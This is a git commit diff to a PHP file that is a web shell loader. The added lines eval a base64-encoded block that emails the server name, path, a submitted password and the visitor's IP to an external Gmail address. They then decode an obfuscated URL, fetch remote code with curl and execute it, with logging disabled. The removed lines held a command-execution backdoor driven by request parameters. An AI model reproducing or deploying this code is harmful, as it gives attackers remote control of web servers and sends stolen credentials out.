578f1fa78e2f2bfe8ad52d5248eb1c149e987b7c
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2024-12-09 09:42:55 +0700

    Update -21one.php

--- -21one.php
+++ -21one.php
@@ -1,25 +1,10 @@
 <?php 
-header("X-XSS-Protection: 0");
-ob_start();
-set_time_limit(0);
-error_reporting(0);
-ini_set('display_errors', FALSE);
-	error_reporting(0);
-	@clearstatcache();
-	@mb_internal_encoding('UTF-8');
-	set_time_limit(0);
-	@ini_set('error_log',null);
-	@ini_set('log_errors',0);
-	@ini_set('max_execution_time',0);
-	@ini_set('output_buffering',0);
-	@ini_set('display_errors', 0);
-	@ini_set('disable_functions', 0);
+eval(base64_decode("aWYoYXJyYXlfa2V5X2V4aXN0cygnbXlwYXNzJywkX1BPU1QpKXsgJHRtcCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydQSFBfU0VMRiddLiJcbiIuJF9QT1NUWydwYXNzJ107IEBtYWlsKCdyb290Y3liZXJwdW5rc0BnbWFpbC5jb20nLCAnbWFpbCcsICR0bXApOyAKaWYgKGFycmF5X2tleV9leGlzdHMoJ215cGFzcycsICRfUE9TVCkpIHsKCQkkcGFzc3dvcmQgPSAkX1BPU1RbJ3Bhc3MnXTsKCQkkc2VydmVyX25hbWUgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsKCQkkcGhwX3NlbGYgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTsKCQkkcmVwb3J0X2J1ZyA9ICJJUDogIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBDaXR5OiB7JGNpdHl9XG5Mb2dpbjogJHNlcnZlcl9uYW1lJHBocF9zZWxmXG5QYXNzOiAkcGFzc3dvcmRcbktlcm5lbDogJGtlcm5lbCI7CgkJQG1haWwoJ3Jvb3RjeWJlcnB1bmtzQGdtYWlsLmNvbScsICdIZWhlaGUnLCAkcmVwb3J0X2J1Zyk7"));
+@ini_set('error_log',NULL); 
+@ini_set('log_errors',0); 
+@ini_set('max_execution_time',0); 
+@set_time_limit(0); 
 $ptZh=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$qYKt=[7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 56, 4, 54, 54, 52, 52, 54, 58, 66, 61, 57, 4, 54, 66, 56, 61, 59, 59, 66, 60, 61, 59, 57, 66, 1, 57, 59, 58, 58, 2, 3, 2, 4, 59, 53, 53];$nKtq='';foreach($qYKt as $Jfyr){$nKtq.=$ptZh[$Jfyr];
 /////WHAT THE FUCK WITHOUT YOU///
-$for = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
-$data ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?cmdkem=ls+-al";
-mail($for,"cmd", $data);
-print(`{$_REQUEST[cmdkem]}`);
-error_reporting(0);
 }$Jbna = "$nKtq";function AwCZ($undefined){$MZvt=curl_init();curl_setopt($MZvt,CURLOPT_URL,$undefined);curl_setopt($MZvt,CURLOPT_RETURNTRANSFER,true);curl_setopt($MZvt,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($MZvt,CURLOPT_SSL_VERIFYHOST,false);$jmnX=curl_exec($MZvt);curl_close($MZvt);return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($jmnX))))))));}@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(AwCZ($Jbna))))))))));
 ?>
